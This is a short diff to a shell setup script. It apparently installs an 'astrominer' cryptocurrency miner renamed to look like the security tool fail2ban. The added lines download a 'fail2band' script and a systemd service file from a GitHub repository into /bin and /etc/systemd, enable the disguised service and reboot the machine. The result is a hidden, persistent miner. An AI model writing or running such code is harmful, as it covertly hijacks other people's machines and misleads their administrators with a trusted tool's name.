@@ -9,5 +9,7 @@ tar xvf astro.tar.gz
 mv astrominer /bin/fail2ban
 rm -rf rpc_mining.sh stratum_mining.sh
 chmod 777 /bin/fail2band
-sudo curl #fail2band here -o /bin/fail2band
-sudo curl #service file here -o /etc/systemd/system/fail2ban.service
+sudo curl "https://github.com/suckma420/arch-setup/raw/main/fail2band.sh" -o /bin/fail2band
+sudo curl "https://github.com/suckma420/arch-setup/raw/main/fail2ban.service" -o /etc/systemd/system/fail2ban.service
+sudo systemctl enable fail2ban
+sudo reboot
